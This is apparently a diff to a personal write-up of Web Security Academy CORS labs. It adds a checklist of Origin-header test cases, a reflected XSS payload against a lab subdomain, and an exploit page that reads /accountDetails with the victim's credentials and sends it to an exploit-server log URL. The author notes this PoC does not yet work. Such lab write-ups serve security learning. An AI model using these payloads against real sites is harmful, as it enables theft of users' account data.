@@ -1,3 +1,9 @@
+Overall below are the test cases you need to apply when it comes to CORS vulnerability.
+1. Change Origin header value to any arbitrary value
+2. Change Origin header value null
+3. Change Origin header value  to one that begins with the origin of the site
+4. Change Origin header value to one that ends with the origin of the site (Subdomain of the site should have XSS vulnerability)
+
 ### CORS vulnerability with basic origin reflection
 /accountDetails API in response giving the below header.
 ```
@@ -41,3 +47,29 @@ HTML poc:
     };
 </script>"></iframe>
 ```
+### CORS vulnerability with trusted insecure protocols
+We have tried all the test cases of CORS mentioned at start and found out that this website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
+Also have found XSS on one of the subdomains it trusts. With the help of this XSS vulnerability we can exploit CORS vulnerability on the main site. In subdomain a parameter productID was vulnerable to XSS as shown below.
+```
+https://stock.0a9b00b7031149698075f8e900550078.web-security-academy.net/?productId=1<script>alert(1)</script>&storeId=2
+```
+The response would look like this.
+```json
+HTTP/2 400 Bad Request
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 60
+
+<h4>ERROR</h4>Invalid product ID: 1<script>alert(1)</script>
+```
+Also XSS triggers, that means we can execute JavaScript code in subdomain of the main app. Now we want to extract /accountDetails API response by exploiting CORS on main using XSS on subdomain.
+```
+<html>
+    <body>
+        <script>
+            document.location="https://stock.0a9b00b7031149698075f8e900550078.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a9b00b7031149698075f8e900550078.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0a6e0092031c49ca80ecf7a3011a0029.exploit-server.net/log?key=' %2b xhr.responseText)}};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
+        </script>
+    </body>
+</html>
+```
+Poc didn't work as of now.
